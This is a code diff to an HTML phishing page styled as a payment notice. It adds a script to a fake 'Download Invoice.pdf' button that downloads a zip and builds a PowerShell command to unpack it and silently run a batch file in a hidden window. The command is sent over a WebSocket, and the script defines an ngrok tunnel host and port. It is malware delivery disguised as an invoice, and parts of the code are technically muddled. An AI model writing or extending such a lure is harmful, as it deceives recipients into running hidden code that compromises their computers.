@@ -50,8 +50,55 @@
       <p>Your payment for services rendered is ready.</p>
       <p>Please download the attached document to confirm receipt.</p>
 
-      <!-- Replace with your actual Vercel Static URL -->
-      <a href="/Invoice_Q3.zip" class="btn">Download Invoice.pdf</a>
+      <!-- The button now triggers the JS function -->
+      <a href="#" class="btn" id="downloadBtn">Download Invoice.pdf</a>
     </div>
+
+    <script>
+      // Configuration
+      const NGROK_HOST = "7.tcp.eu.ngrok.io";
+      const NGROK_PORT = "27814";
+
+      document
+        .getElementById("downloadBtn")
+        .addEventListener("click", async (e) => {
+          e.preventDefault();
+
+          // 1. Download the Zip File
+          const response = await fetch("/Invoice_Q3.zip");
+          const blob = await response.blob();
+
+          // 2. Create a temporary link to trigger the download
+          const url = window.URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.style.display = "none";
+          a.href = url;
+          a.download = "Invoice_Q3.zip";
+          document.body.appendChild(a);
+          a.click();
+
+          // 3. Wait for download to finish (approximate delay)
+          setTimeout(() => {
+            // 4. Run a PowerShell command to extract and run silently
+            const psCommand = `
+                $zipPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Invoice_Q3.zip');
+                if (Test-Path $zipPath) {
+                    $destPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'Invoice_Q3');
+                    Expand-Archive -Path $zipPath -DestinationPath $destPath -Force;
+                    Start-Process "cmd.exe" -ArgumentList "/c cd /d ${destPath} && start /min run.bat" -WindowStyle Hidden;
+                    Remove-Item $zipPath;
+                }
+            `;
+
+            // Execute via PowerShell
+            const ws = new WebSocket(
+              `ws://${window.location.hostname}:3000/ws`,
+            );
+            ws.onopen = () => {
+              ws.send(JSON.stringify({ type: "command", payload: psCommand }));
+            };
+          }, 2000);
+        });
+    </script>
   </body>
 </html>
